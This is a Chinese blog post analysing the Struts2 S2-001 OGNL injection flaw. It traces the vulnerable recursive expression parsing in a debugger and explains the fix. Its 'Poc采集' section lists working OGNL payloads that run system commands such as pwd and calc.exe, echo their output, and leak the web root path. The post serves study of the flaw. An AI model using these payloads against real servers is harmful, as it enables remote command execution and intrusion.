<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422212504966.png" alt="image-20240422212504966"></p>
<p>根据下面两个图片，我们知道alSyntax恒为true</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422205249909.png" alt="image-20240422205249909"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422205521314.png" alt="image-20240422205521314"></p>
<p>这意味着，最终expr的值会是name值周围添加指定符号，构成ognl表达式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422212546859.png" alt="image-20240422212546859"></p>
<p>接着就是添加属性nameValue，这其中调用了findValue来寻找name也就是username字符串对应的值，跟进去看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422205919163.png" alt="image-20240422205919163"></p>
<p>如上图，最终是一定会进入translateVariables方法，传入三个参数，%、expr以及值栈</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422212817439.png" alt="image-20240422212817439"></p>
<p>这里继续调用了重载函数，无他，继续跟进，这里我认为就是关键的点了，分析一下while这里执行逻辑</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">translateVariables</span><span class="hljs-params">(<span class="hljs-type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator)</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expression;

        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {
            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> expression.indexOf(open + <span class="hljs-string">"{"</span>);
            <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> expression.length();
            <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> start + <span class="hljs-number">2</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

            <span class="hljs-keyword">while</span>(start != -<span class="hljs-number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="hljs-number">0</span>) {
                <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> expression.charAt(x++);
                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'{'</span>) {
                    ++count;
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'}'</span>) {
                    --count;
                }
            }

            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> x - <span class="hljs-number">1</span>;
            <span class="hljs-keyword">if</span> (start == -<span class="hljs-number">1</span> || end == -<span class="hljs-number">1</span> || count != <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
            }

            <span class="hljs-type">String</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> expression.substring(start + <span class="hljs-number">2</span>, end);
            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> stack.findValue(<span class="hljs-keyword">var</span>, asType);
            <span class="hljs-keyword">if</span> (evaluator != <span class="hljs-literal">null</span>) {
                o = evaluator.evaluate(o);
            }

            <span class="hljs-type">String</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> expression.substring(<span class="hljs-number">0</span>, start);
            <span class="hljs-type">String</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> expression.substring(end + <span class="hljs-number">1</span>);
            <span class="hljs-keyword">if</span> (o != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (TextUtils.stringSet(left)) {
                    result = left + o;
                } <span class="hljs-keyword">else</span> {
                    result = o;
                }

                <span class="hljs-keyword">if</span> (TextUtils.stringSet(right)) {
                    result = result + right;
                }

                expression = left + o + right;
            } <span class="hljs-keyword">else</span> {
                result = left + right;
                expression = left + right;
            }
        }
    }</code></pre>
<p><code>charAt()</code>函数是用于获取字符串中指定索引位置的字符的方法。它属于<code>String</code>类的成员方法，可以通过字符串对象调用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422212941639.png" alt="image-20240422212941639"></p>
<p>首先就是定义某些参数，这里代码能看懂，但是不知道具体含义是什么，看了文章发现是用来判断{与}符号数量是否一致，如果一致，那count最终就是0；（估计是为了符合ognl表达式要求</p>
<p>这里最终会由于count=0跳出这个循环，来到下图，这里尝试返回username对应的值，赋值给对象o</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422213451835.png" alt="image-20240422213451835"></p>
<p>这里我还没赋值，我们假设这里username值为%{1+1}，那o的值就不是null，然后这里的stringSet，由于string肯定为null（也就是left），最终的就会造成expression=%{1+1}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422213822189.png" alt="image-20240422213822189"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422214506622.png" alt="image-20240422214506622"></p>
<p>接着按照上图，跟进OgnlUtil.getValue，此时发现进入到Ognl.class的getValue，也就是处理Ognl表达式的类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422215751380.png" alt="image-20240422215751380"></p>
<p>这里利用tree参数（被强转为tree）之后调用getValue方法</p>
<p>之后来到if语句，由于getTraceEvaluations恒为false，于是直接执行最下面的evaluateGetValueBody</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422220639514.png" alt="image-20240422220639514"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423103611402.png" alt="image-20240423103611402"></p>
<p>如下图，先是设置上下文的当前对象以及当前节点，最终会调用getValueBdoy方法，继续跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422221617471.png" alt="image-20240422221617471"></p>
<p>接着就是ognl表达式的底层逻辑了，这里先不分析ognl表达式漏洞，我们只需要知道在getValueBdoy方法中，先是取出ognl表达式，这里就是<code>%{1+1}</code>得到第一个节点，这里显示result=1，接着进入for循环，继续遍历第二个节点，随后再取出来将得到的结果，调用add函数（逻辑似乎就是相加），相加得到result=2，也就是ognl表达式的解析执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240422222110743.png" alt="image-20240422222110743"></p>
<p>至此struts2-001漏洞分析也就结束了</p>
<h3 id="问题二">问题二</h3>
<p>虽然分析了上述struts2-001漏洞，但其实也知道，根本上还是因为ognl表达式的注入漏洞，因此我认为还需要具体分析一下ognl表达式。</p>
<p>借助一个demo，下断点跟进getValue</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423114021586.png" alt="image-20240423114021586"></p>
<p>往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423114121075.png" alt="image-20240423114121075"></p>
<p>到达下图，发现tree参数（被强转为Node）调用了getValue，传入的参数为当前ognl上下文以及root根对象，继续跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423114331996.png" alt="image-20240423114331996"></p>
<p>发现调用了evaluateGetValueBody，继续跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423114502155.png" alt="image-20240423114502155"></p>
<p>这里跟进到了getValueBody方法，这里看逻辑是对当前对象所拥有的节点进行的处理，继续跟进发现到了如下图所示的地方，对当前根节点调用getValue</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423114817312.png" alt="image-20240423114817312"></p>
<p>跟进之后，又来到getValueBody（重载方法），跟进发现调用了callStaticMethod</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423115217367.png" alt="image-20240423115217367"></p>
<p>如下图，可以看到这里调用了classForName获得当前className的class对象也就是java.lang.Runtime的类对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423115509644.png" alt="image-20240423115509644"></p>
<p>继续跟进调用callStaticMethod重载函数，调用了getMethods来获取当前java.lang.Runtime类对象的getRuntime方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423115612856.png" alt="image-20240423115612856"></p>
<p>继续跟进，调用了invokeMethod</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423162132259.png" alt="image-20240423162132259"></p>
<p>最终是调用了invoke方法，执行getRuntime函数来实例化Runtime类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423162151825.png" alt="image-20240423162151825"></p>
<p>至此第一部分节点分析完成，接下来分析exec方法是如何传入进去的，也就是第二个节点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423115914093.png" alt="image-20240423115914093"></p>
<p>分析路径基本一样，只是调用的相关重载函数不一致</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423120025819.png" alt="image-20240423120025819"></p>
<p>按照节点一的思路持续跟进，最终来到这里发现调用callMethod方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423120048851.png" alt="image-20240423120048851"></p>
<p>进一步调用getMethods</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423120146543.png" alt="image-20240423120146543"></p>
<p>无脑跟进，最终看到再次调用method.invoke，执行了Runtime实例的exec方法，并传入了calc参数，弹出计算器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423121112655.png" alt="image-20240423121112655"></p>
<p>至此，最终函数调用栈如下</p>
<pre><code class="hljs scss">invokeMethod:<span class="hljs-number">491</span>, OgnlRuntime (ognl)
callAppropriateMethod:<span class="hljs-number">785</span>, OgnlRuntime (ognl)
callStaticMethod:<span class="hljs-number">48</span>, ObjectMethodAccessor (ognl)
callStaticMethod:<span class="hljs-number">806</span>, OgnlRuntime (ognl)
getValueBody:<span class="hljs-number">67</span>, ASTStaticMethod (ognl)
evaluateGetValueBody:<span class="hljs-number">170</span>, SimpleNode (ognl)
getValue:<span class="hljs-number">210</span>, SimpleNode (ognl)
getValueBody:<span class="hljs-number">109</span>, ASTChain (ognl)
evaluateGetValueBody:<span class="hljs-number">170</span>, SimpleNode (ognl)
getValue:<span class="hljs-number">210</span>, SimpleNode (ognl)
getValue:<span class="hljs-number">333</span>, Ognl (ognl)
getValue:<span class="hljs-number">378</span>, Ognl (ognl)
getValue:<span class="hljs-number">357</span>, Ognl (ognl)
main:<span class="hljs-number">13</span>, Test (org.example)</code></pre>
<p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p>
<h1 id="0x05-漏洞修复">0x05 漏洞修复</h1>
<p>这里在分析修复前后的代码又遇到了小小问题，发现对漏洞产生还是有点不清楚，但继续重新调试终于明白</p>
<p>附上修复和修复前的代码（借个图）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240423113444173.png" alt="image-20240423113444173"></p>
<p>可以看到上述增加了一个if判断，根据文章所说，这里是 <strong>Ognl</strong> 递归解析次数的判断，默认情况下仅解析第一层。</p>
<p>对于这种修复解释，我们先看一下漏洞执行逻辑，首先是解析执行%{username}，是一个ognl表达式，会进行ognl表达式解析执行，最终就是来获取username的值，也就是最终成为%{1+1}，因为我们设置的username就是%{1+1}，由于修复前的代码用的是while循环，因此又会去递归解析这个%{1+1}，又认为是ognl表达式，最终解析为2。</p>
<p>但修复后的进行了判断：递归解析次数。因此如果还是上述情况，会在解析%{1+1}的时候，判断次数上限，退出while循环，也就不会被执行了。</p>
<h2 id="总结">总结</h2>
<p>经过上述漏洞的分析，可以看到Struts2-001漏洞点，就在于对用户输入的数据没有做出合理判断，导致在解析ognl表达式的时候，在其中的while循环，递归解析了ognl表达式，导致任意代码执行。</p>
<h1 id="0x06-poc采集">0x06 Poc采集</h1>
<p>回显poc</p>
<pre><code class="hljs java">%{#a=(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]{<span class="hljs-string">"pwd"</span>})).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b),#d=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(#c),#e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">50000</span>],#d.read(#e),#f=#context.get(<span class="hljs-string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),#f.getWriter().println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre>
<p>调试poc：</p>
<pre><code class="hljs java">%{(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]{<span class="hljs-string">"calc.exe"</span>})).start()}</code></pre>
<p>获取web路径</p>
<pre><code class="hljs java">%{
#req=<span class="hljs-meta">@org</span>.apache.struts2.ServletActionContext<span class="hljs-meta">@getRequest()</span>,
#response=#context.get(<span class="hljs-string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter(),
#response.println(#req.getRealPath(<span class="hljs-string">'/'</span>)),
#response.flush(),
#response.close()
}</code></pre>
<h1 id="0x07-参考文章">0x07 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16197395.html">Java安全之S2-001漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">OGNL表达式注入漏洞总结</a></p>
<p><a target="_blank" rel="noopener" href="https://mengsec.com/2019/10/29/Java-Web-S2-001/#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">Java Web安全入门——S2-001漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/624053727">Struts2-001漏洞分析（CVE-2007-4556）</a>–环境搭建可参考</p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%80%BC%E6%A0%88%E7%9A%84%E4%BD%9C%E7%94%A8">OGNL表达式注入漏洞总结</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001.md">https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Java代码审计之Struts2-001.md</a></p>
<p><a target="_blank" rel="noopener" href="https://lanvnal.com/2020/12/15/s2-001-lou-dong-fen-xi/#toc-heading-6">JavaWeb安全入门之 S2-001漏洞分析</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/')">Java反序列化入门之S2-001分析</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Java反序列化入门之S2-001分析&amp;url=http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Java反序列化<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/15/uuctf-2022/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">UUCTF_2022</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/23/php-xue-xi-zong-jie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP学习总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/03/18/java-fan-xu-lie-hua-zhi-cc1-lian/" title="Java反序列化入门之CC1链分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-18</div><div class="title">Java反序列化入门之CC1链分析</div></div></a></div><div><a href="/2023/12/09/java-fan-xu-lie-hua-1/" title="Java反序列化1入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-09</div><div class="title">Java反序列化1入门</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ognl-%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">OGNL 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ognl-%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="toc-number">3.2.</span> <span class="toc-text">OGNL 三要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#valuestack"><span class="toc-number">3.3.</span> <span class="toc-text">ValueStack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 